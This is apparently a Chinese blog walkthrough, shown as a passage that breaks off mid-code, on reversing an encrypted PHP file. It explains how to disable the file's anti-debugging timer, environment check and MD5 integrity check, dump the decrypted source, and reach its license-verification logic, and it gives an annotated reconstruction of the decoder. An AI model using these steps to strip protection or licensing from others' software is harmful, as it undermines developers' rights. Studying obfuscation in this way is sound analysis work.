<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" data-fancybox="group" data-caption="decode5" class="fancybox"><img alt="decode5" title="decode5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" class="lazyload"></a></p>
<h3 id="然后看后面的-38-42行代码"><a href="#然后看后面的-38-42行代码" class="headerlink" title="然后看后面的 38-42行代码"></a>然后看后面的 38-42行代码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">argc = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) * <span class="number">1000</span> - argc &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>查了下，是用来防止下断点调试的，如果下断点调试，这里就超过 100 毫秒，然后就退出了。<br>因此决定直接在这条语句之后下断点，让代码一连串执行完，这样就不会超过 100 毫秒了,直接注释掉也行<br>然后再来看一下后面43行这个 <code>eval</code><br>回显结果跑到了71行这里</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" data-fancybox="group" data-caption="decode6" class="fancybox"><img alt="decode6" title="decode6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" class="lazyload"></a></p>
<p>看起来好像没什么帮助，注释掉之后</p>
<h3 id="看44行"><a href="#看44行" class="headerlink" title="看44行"></a>看44行</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">decode_func</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, -<span class="number">45</span>, -<span class="number">1</span>)), <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, <span class="number">0</span>, -<span class="number">46</span>))) ? <span class="variable">$undefined1</span>() : <span class="variable">$undefined2</span>;</span><br></pre></td></tr></table></figure></div>

<p>用来校验数据完整性的代码，这里的 <code>$undefined1</code> 和 <code>$undefined2</code> 都没有定义。如果验证失败，就会调用 <code>$undefined1</code> 会直接 <code>Error</code> 退出程序。而如果验证成功，虽然 <code>$undefined2</code> 变量不存在，但是只是一个 <code>Warning</code>，没有太大问题。</p>
<p>其中的 <code>decode_func</code> 就是加密代码中最后一个函数，专门负责字符串解码的。<br>验证方法就是把文件尾部分解密和前面的文件主体部分的 md5 对比，这次执行肯定又不能通过。<br>退出程序，注释掉，再重新运行。</p>
<hr>
<h3 id="47行找到关键性代码"><a href="#47行找到关键性代码" class="headerlink" title="47行找到关键性代码"></a>47行找到关键性代码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$decrypted</span> = <span class="title function_ invoke__">str_rot13</span>(@<span class="title function_ invoke__">gzuncompress</span>(<span class="title function_ invoke__">decode_func</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, -<span class="number">1522</span>, -<span class="number">46</span>))));</span><br></pre></td></tr></table></figure></div>

<p>同时可以看到已经 <code>return</code> 加密前的代码了，上述的 <code>-1522</code>就是最先提到的加密代码末尾 <code>?&gt;</code> 后的第一个字符</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" data-fancybox="group" data-caption="decode7" class="fancybox"><img alt="decode7" title="decode7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" class="lazyload"></a></p>
<h3 id="然后跳到最后"><a href="#然后跳到最后" class="headerlink" title="然后跳到最后"></a>然后跳到最后</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$f_varname</span> = <span class="string">&#x27;_f_&#x27;</span>;</span><br><span class="line"><span class="variable">$decrypted</span> = <span class="title function_ invoke__">check_and_decrypt</span>($&#123;<span class="variable">$f_varname</span>&#125;);</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">dirname</span>($&#123;<span class="variable">$f_varname</span>&#125;));</span><br><span class="line"><span class="variable">$base64_encoded_decrypted</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$decrypted</span>);</span><br><span class="line"><span class="variable">$eval_string</span> = <span class="string">&#x27;eval(base64_decode($base64_encoded_decrypted));&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">eval</span>(<span class="variable">$eval_string</span>);</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">dirname</span>($&#123;<span class="variable">$f_varname</span>&#125;));</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure></div>

<p>怎么打印出来呢<br>直接在 <code>$decrypted</code> 后面加上一行 <code>file_put_contents</code> 就可以了。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" data-fancybox="group" data-caption="decode7_2" class="fancybox"><img alt="decode7_2" title="decode7_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" class="lazyload"></a></p>
<p>然后便可以看到解密后的源码</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" data-fancybox="group" data-caption="decode8" class="fancybox"><img alt="decode8" title="decode8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" class="lazyload"></a></p>
<p>如果将上述的 35行 <code>server_host</code> 改成 <code>&#39;127.0.0.1&#39;</code> 还可以看到服务器返回的请求验证数据代码</p>
<h3 id="50行-decode-func"><a href="#50行-decode-func" class="headerlink" title="50行 decode_func"></a>50行 decode_func</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" data-fancybox="group" data-caption="decode9" class="fancybox"><img alt="decode9" title="decode9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" class="lazyload"></a></p>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>感谢 <a href="https://www.52pojie.cn/thread-693641-1-1.html">Ganlv 师傅</a> 的一路指导</p>
<h3 id="大致的加密源码"><a href="#大致的加密源码" class="headerlink" title="大致的加密源码"></a>大致的加密源码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先把这两行去掉，防止出现什么问题，我们还什么都不知道。</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="comment">// ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;jnggfmpt&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;jnggfmpt&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;func2&#x27;</span>) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 第一个函数返回 &#x27;base64_decode&#x27; ，这个函数不依赖其他任何函数，单纯地返回一个字符串 &#x27;base64_decode&#x27;。</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$v1</span> = <span class="string">&#x27;6f6e66723634&#x27;</span>;</span><br><span class="line">            <span class="variable">$v2</span> = <span class="string">&#x27;pa&#x27;</span>;</span><br><span class="line">            <span class="variable">$v3</span> = <span class="string">&#x27;7374725f&#x27;</span>;</span><br><span class="line">            <span class="variable">$v4</span> = <span class="string">&#x27;H&#x27;</span> . <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">            <span class="variable">$v2</span> .= <span class="string">&#x27;ck&#x27;</span>; <span class="comment">// $v2 = &#x27;pack&#x27;;</span></span><br><span class="line">            <span class="variable">$v1</span> .= <span class="string">&#x27;5f717270627172&#x27;</span>; <span class="comment">// $v1 = &#x27;6f6e667236345f717270627172&#x27;;</span></span><br><span class="line">            <span class="variable">$v3</span> .= <span class="string">&#x27;726f743133&#x27;</span>; <span class="comment">// $v3 = &#x27;7374725f726f743133&#x27;;</span></span><br><span class="line">            <span class="comment">// $v5 = $v2($v4, $v3);</span></span><br><span class="line">            <span class="variable">$v5</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;H*&#x27;</span>, <span class="string">&#x27;7374725f726f743133&#x27;</span>);</span><br><span class="line">            <span class="comment">// $v5 = &#x27;str_rot13&#x27;;</span></span><br><span class="line">            <span class="comment">// $v6 = $v5($v2($v4, $v1));</span></span><br><span class="line">            <span class="variable">$v6</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">pack</span>(<span class="string">&#x27;H*&#x27;</span>, <span class="string">&#x27;6f6e667236345f717270627172&#x27;</span>));</span><br><span class="line">            <span class="comment">// $v6 = &#x27;base64_decode&#x27;;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$v6</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二个函数接受两个参数，要注意第一个参数还是一个引用参数。</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params">&amp;<span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 第一句是令一堆变量等于 func4</span></span><br><span class="line">            <span class="comment">// $v1 - $v5 都使用 func4 解码一个字符串，结果如下</span></span><br><span class="line">            <span class="variable">$v1</span> = <span class="string">&#x27;str_rot13&#x27;</span>;</span><br><span class="line">            <span class="variable">$v2</span> = <span class="string">&#x27;strrev&#x27;</span>;</span><br><span class="line">            <span class="variable">$v3</span> = <span class="string">&#x27;gzuncompress&#x27;</span>;</span><br><span class="line">            <span class="variable">$v4</span> = <span class="string">&#x27;stripslashes&#x27;</span>;</span><br><span class="line">            <span class="variable">$v5</span> = <span class="string">&#x27;explode&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v6 = $v1($v2($v3($v4(func4(&#x27;??????&#x27;)))));</span></span><br><span class="line">            <span class="comment">// $v6 = str_rot13(strrev(gzuncompress(stripslashes(func4(&#x27;??????&#x27;)))));</span></span><br><span class="line">            <span class="variable">$v6</span> = <span class="string">&#x27;,chr,addslashes,rand,gzuncompress,assert_options,assert,file_get_contents,substr,unpack,constant,strpos,create_function,str_rot13,md5,set_include_path,dirname,preg_replace,base64_encode,base64_decode,&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v7 = $v5($v6);</span></span><br><span class="line">            <span class="comment">// $v7 = explode($v6);</span></span><br><span class="line">            <span class="variable">$v7</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="number">0</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="number">1</span> =&gt; <span class="string">&quot;chr&quot;</span>,</span><br><span class="line">                <span class="number">2</span> =&gt; <span class="string">&quot;addslashes&quot;</span>,</span><br><span class="line">                <span class="number">3</span> =&gt; <span class="string">&quot;rand&quot;</span>,</span><br><span class="line">                <span class="number">4</span> =&gt; <span class="string">&quot;gzuncompress&quot;</span>,</span><br><span class="line">                <span class="number">5</span> =&gt; <span class="string">&quot;assert_options&quot;</span>,</span><br><span class="line">                <span class="number">6</span> =&gt; <span class="string">&quot;assert&quot;</span>,</span><br><span class="line">                <span class="number">7</span> =&gt; <span class="string">&quot;file_get_contents&quot;</span>,</span><br><span class="line">                <span class="number">8</span> =&gt; <span class="string">&quot;substr&quot;</span>,</span><br><span class="line">                <span class="number">9</span> =&gt; <span class="string">&quot;unpack&quot;</span>,</span><br><span class="line">                <span class="number">10</span> =&gt; <span class="string">&quot;constant&quot;</span>,</span><br><span class="line">                <span class="number">11</span> =&gt; <span class="string">&quot;strpos&quot;</span>,</span><br><span class="line">                <span class="number">12</span> =&gt; <span class="string">&quot;create_function&quot;</span>,</span><br><span class="line">                <span class="number">13</span> =&gt; <span class="string">&quot;str_rot13&quot;</span>,</span><br><span class="line">                <span class="number">14</span> =&gt; <span class="string">&quot;md5&quot;</span>,</span><br><span class="line">                <span class="number">15</span> =&gt; <span class="string">&quot;set_include_path&quot;</span>,</span><br><span class="line">                <span class="number">16</span> =&gt; <span class="string">&quot;dirname&quot;</span>,</span><br><span class="line">                <span class="number">17</span> =&gt; <span class="string">&quot;preg_replace&quot;</span>,</span><br><span class="line">                <span class="number">18</span> =&gt; <span class="string">&quot;base64_encode&quot;</span>,</span><br><span class="line">                <span class="number">19</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>,</span><br><span class="line">                <span class="number">20</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">            );</span><br><span class="line">            <span class="variable">$arg1</span> = <span class="variable">$v7</span>[<span class="variable">$arg2</span>];</span><br><span class="line">            <span class="comment">// 看到这里知道了，这个函数就是用来需要用的提取函数名的</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第三个函数被主程序调用了</span></span><br><span class="line">        <span class="comment">// 不过分析之后发现这个 $arg1 参数并没有用到</span></span><br><span class="line">        <span class="comment">// 这个函数的前半部分是防止调试</span></span><br><span class="line">        <span class="comment">// 后半部分是提取后面加密的代码</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func3</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$_v1</span>, <span class="comment">// $_v1 = &#x27;file_get_contents&#x27;;</span></span><br><span class="line">            <span class="variable">$_v3</span>, <span class="comment">// $_v3 = &#x27;substr&#x27;;</span></span><br><span class="line">            <span class="variable">$_v4</span>, <span class="comment">// $_v4 = &#x27;assert&#x27;;</span></span><br><span class="line">            <span class="variable">$_v5</span>, <span class="comment">// $_v5 = &#x27;assert_options&#x27;;</span></span><br><span class="line">            <span class="variable">$_v6</span>, <span class="comment">// $_v6 = &#x27;unpack&#x27;;</span></span><br><span class="line">            <span class="variable">$_v7</span>, <span class="comment">// $_v7 = &#x27;constant&#x27;;</span></span><br><span class="line">            <span class="variable">$_v8</span>, <span class="comment">// $_v8 = &#x27;preg_replace&#x27;;</span></span><br><span class="line">            <span class="variable">$_v9</span>, <span class="comment">// $_v9 = &#x27;base64_encode&#x27;;</span></span><br><span class="line">            <span class="variable">$_v10</span>, <span class="comment">// $_v10 = &#x27;gzuncompress&#x27;;</span></span><br><span class="line">            <span class="variable">$_v11</span>, <span class="comment">// $_v11 = &#x27;create_function&#x27;;</span></span><br><span class="line">            <span class="variable">$_v12</span>, <span class="comment">// $_v12 = &#x27;strpos&#x27;;</span></span><br><span class="line">            <span class="variable">$_v13</span>, <span class="comment">// $_v13 = &#x27;addslashes&#x27;;</span></span><br><span class="line">            <span class="variable">$_v14</span>, <span class="comment">// $_v14 = &#x27;str_rot13&#x27;;</span></span><br><span class="line">            <span class="variable">$_v15</span>, <span class="comment">// $_v15 = &#x27;md5&#x27;;</span></span><br><span class="line">            <span class="variable">$_v16</span>, <span class="comment">// $_v16 = &#x27;set_include_path&#x27;;</span></span><br><span class="line">            <span class="variable">$_v17</span>; <span class="comment">// $_v17 = &#x27;dirname&#x27;;</span></span><br><span class="line">            <span class="comment">// 这里有一堆变量等于 func4，然后用他们解码得到 $v1 - $v5</span></span><br><span class="line">            <span class="variable">$v1</span> = <span class="string">&#x27;php_sapi_name&#x27;</span>;</span><br><span class="line">            <span class="variable">$v2</span> = <span class="string">&#x27;die&#x27;</span>;</span><br><span class="line">            <span class="variable">$v3</span> = <span class="string">&#x27;cli&#x27;</span>;</span><br><span class="line">            <span class="variable">$v4</span> = <span class="string">&#x27;microtime&#x27;</span>;</span><br><span class="line">            <span class="variable">$v5</span> = <span class="string">&#x27;1000&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v1() == $v3 ? $v2() : &#x27;&#x27;;</span></span><br><span class="line">            <span class="comment">// 这句话在调试的时候需要注释掉</span></span><br><span class="line">            <span class="title function_ invoke__">php_sapi_name</span>() == <span class="string">&#x27;cli&#x27;</span> ? <span class="keyword">die</span>() : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="comment">// file_get_contents(constant(func4(&#x27;??????&#x27;)));</span></span><br><span class="line">            <span class="variable">$v7</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="comment">// $v8 = $v4(true) * $v5;</span></span><br><span class="line">            <span class="variable">$v8</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) * <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="comment">// if ($v4(true) * $v5 - $v8 &gt; 100) &#123;</span></span><br><span class="line">            <span class="comment">// 这里是防止下断点调试的，下断点调试，这里就超过 100 毫秒了，直接注释掉</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) * <span class="number">1000</span> - <span class="variable">$v8</span> &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="comment">// $v2();</span></span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// eval(func4(&#x27;??????&#x27;));</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27;if(strpos(__FILE__, msvigqgq) !== 0)&#123;$exitfunc();&#125;&#x27;</span>);</span><br><span class="line">            <span class="comment">// $_v12(func4($_v3($v7, func4(&#x27;??????&#x27;), func4(&#x27;??????&#x27;))), $_v15($_v3($v7, func4(&#x27;??????&#x27;), func4(&#x27;??????&#x27;)))) ? $v9() : $v10;</span></span><br><span class="line">            <span class="comment">// 这里的 $v9 和 $v10 都没有定义，如果验证失败，就会调用 $v9 会直接出错退出程序</span></span><br><span class="line">            <span class="comment">// 而如果验证成功 $v10 变量不存在则没问题</span></span><br><span class="line">            <span class="comment">// 验证方法就是把文件尾部分解密和前面的文件主体部分的md5对比，直接注释掉</span></span><br><span class="line">            !<span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">func4</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v7</span>, -<span class="number">45</span>, -<span class="number">1</span>)), <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v7</span>, <span class="number">0</span>, -<span class="number">46</span>))) ? <span class="variable">$v9</span>() : <span class="variable">$v10</span>;</span><br><span class="line">            <span class="comment">// 这两个数值是通过 func4 解码得到的</span></span><br><span class="line">            <span class="variable">$v11</span> = <span class="string">&#x27;-2586&#x27;</span>;</span><br><span class="line">            <span class="variable">$v12</span> = <span class="string">&#x27;-46&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v12 = $_v14(@$_v10(func4(substr($v7, $v11, $v12))));</span></span><br><span class="line">            <span class="variable">$v12</span> = <span class="title function_ invoke__">str_rot13</span>(@<span class="title function_ invoke__">gzuncompress</span>(<span class="title function_ invoke__">func4</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v7</span>, <span class="variable">$v11</span>, <span class="variable">$v12</span>))));</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$v12</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第四个函数有点复杂，这是一个解码函数，用的是异或算法解密，所有调用 func4 的位置都没有提供 $arg2</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func4</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$v1</span> = <span class="string">&#x27;base64_decode&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v2 - $v4 通过 base64_decode 解码得到</span></span><br><span class="line">            <span class="variable">$v2</span> = <span class="string">&#x27;ord&#x27;</span>;</span><br><span class="line">            <span class="variable">$v3</span> = <span class="string">&#x27;strlen&#x27;</span>;</span><br><span class="line">            <span class="variable">$v4</span> = <span class="string">&#x27;chr&#x27;</span>;</span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? $v2(&#x27;?&#x27;) : $arg2;</span></span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? 136 : $arg2;</span></span><br><span class="line">            <span class="variable">$arg2</span> = <span class="number">136</span>;</span><br><span class="line">            <span class="comment">// 这里 $v5 不存在，所以 $v6 = null;</span></span><br><span class="line">            <span class="variable">$v6</span> = <span class="variable">$v5</span>;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($arg1); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; <span class="variable">$v6</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$arg1</span>); <span class="variable">$v6</span>++) &#123;</span><br><span class="line">                <span class="comment">// $v7 .= $v2($arg1[$v6]) &lt; $v2(&#x27;?&#x27;) ? $v2($arg1[$v6]) &gt; $arg2 &amp;&amp; $v2($arg1[$v6]) &lt; 245 ? $v4($v2($arg1[$v6]) / 2) : $arg1[$v6] : &#x27;&#x27;;</span></span><br><span class="line">                <span class="variable">$v7</span> .= <span class="title function_ invoke__">ord</span>(<span class="variable">$arg1</span>[<span class="variable">$v6</span>]) &lt; <span class="number">245</span> ? <span class="title function_ invoke__">ord</span>(<span class="variable">$arg1</span>[<span class="variable">$v6</span>]) &gt; <span class="variable">$arg2</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$arg1</span>[<span class="variable">$v6</span>]) &lt; <span class="number">245</span> ? <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$arg1</span>[<span class="variable">$v6</span>]) / <span class="number">2</span>) : <span class="variable">$arg1</span>[<span class="variable">$v6</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// $v8 = $v1($v7);</span></span><br><span class="line">            <span class="variable">$v8</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v7</span>);</span><br><span class="line">            <span class="variable">$v9</span> = <span class="string">&#x27;md5&#x27;</span>; <span class="comment">// $v9 通过 base64_decode 解码得到</span></span><br><span class="line">            <span class="variable">$v6</span> = <span class="variable">$v5</span>;</span><br><span class="line">            <span class="comment">// $arg2 = $v9(&#x27;8_Q.L2&#x27;);</span></span><br><span class="line">            <span class="comment">// $arg2 = md5(&#x27;8_Q.L2&#x27;);</span></span><br><span class="line">            <span class="variable">$arg2</span> = <span class="string">&#x27;fac02565267d815643cecee75a16c7bd&#x27;</span>;</span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = $v3($arg2);</span></span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = strlen($arg2);</span></span><br><span class="line">            <span class="variable">$v10</span> = <span class="variable">$ctrmax</span> = <span class="number">32</span>;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($v8); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; <span class="variable">$v6</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$v8</span>); <span class="variable">$v6</span>++) &#123;</span><br><span class="line">                <span class="variable">$v10</span> = <span class="variable">$v10</span> ? <span class="variable">$v10</span> : <span class="variable">$ctrmax</span>;</span><br><span class="line">                <span class="variable">$v10</span>--;</span><br><span class="line">                <span class="variable">$v11</span> .= <span class="variable">$v8</span>[<span class="variable">$v6</span>] ^ <span class="variable">$arg2</span>[<span class="variable">$v10</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$v11</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$_v1</span>, <span class="comment">// $_v1 = &#x27;file_get_contents&#x27;;</span></span><br><span class="line"><span class="variable">$_v2</span>, <span class="comment">// $_v2 = &#x27;chr&#x27;;</span></span><br><span class="line"><span class="variable">$_v3</span>, <span class="comment">// $_v3 = &#x27;substr&#x27;;</span></span><br><span class="line"><span class="variable">$_v4</span>, <span class="comment">// $_v4 = &#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$_v5</span>, <span class="comment">// $_v5 = &#x27;assert_options&#x27;;</span></span><br><span class="line"><span class="variable">$_v6</span>, <span class="comment">// $_v6 = &#x27;unpack&#x27;;</span></span><br><span class="line"><span class="variable">$_v7</span>, <span class="comment">// $_v7 = &#x27;constant&#x27;;</span></span><br><span class="line"><span class="variable">$_v8</span>, <span class="comment">// $_v8 = &#x27;preg_replace&#x27;;</span></span><br><span class="line"><span class="variable">$_v9</span>, <span class="comment">// $_v9 = &#x27;base64_encode&#x27;;</span></span><br><span class="line"><span class="variable">$_v10</span>, <span class="comment">// $_v10 = &#x27;gzuncompress&#x27;;</span></span><br><span class="line"><span class="variable">$_v11</span>, <span class="comment">// $_v11 = &#x27;create_function&#x27;;</span></span><br><span class="line"><span class="variable">$_v12</span>, <span class="comment">// $_v12 = &#x27;strpos&#x27;;</span></span><br><span class="line"><span class="variable">$_v13</span>, <span class="comment">// $_v13 = &#x27;addslashes&#x27;;</span></span><br><span class="line"><span class="variable">$_v14</span>, <span class="comment">// $_v14 = &#x27;str_rot13&#x27;;</span></span><br><span class="line"><span class="variable">$_v15</span>, <span class="comment">// $_v15 = &#x27;md5&#x27;;</span></span><br><span class="line"><span class="variable">$_v16</span>, <span class="comment">// $_v16 = &#x27;set_include_path&#x27;;</span></span><br><span class="line"><span class="variable">$_v17</span>; <span class="comment">// $_v17 = &#x27;dirname&#x27;;</span></span><br><span class="line"><span class="comment">// 然后一堆变量等于 func2</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_v1</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 func2 用传递引用变量的方法赋值，简化之后如下</span></span><br><span class="line">    <span class="variable">$_v1</span> = <span class="string">&#x27;file_get_contents&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v3</span> = <span class="string">&#x27;substr&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v6</span> = <span class="string">&#x27;unpack&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v10</span> = <span class="string">&#x27;gzuncompress&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v11</span> = <span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v12</span> = <span class="string">&#x27;strpos&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v13</span> = <span class="string">&#x27;addslashes&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v14</span> = <span class="string">&#x27;str_rot13&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v15</span> = <span class="string">&#x27;md5&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v16</span> = <span class="string">&#x27;set_include_path&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v17</span> = <span class="string">&#x27;dirname&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v8</span> = <span class="string">&#x27;preg_replace&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v9</span> = <span class="string">&#x27;base64_encode&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v7</span> = <span class="string">&#x27;constant&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v5</span> = <span class="string">&#x27;assert_options&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v4</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v2</span> = <span class="string">&#x27;chr&#x27;</span>;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="string">&#x27;rand&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 一堆变量等于 func4，然后用 func4 解码</span></span><br><span class="line"><span class="variable">$v2</span> = <span class="string">&#x27;_f_&#x27;</span>;</span><br><span 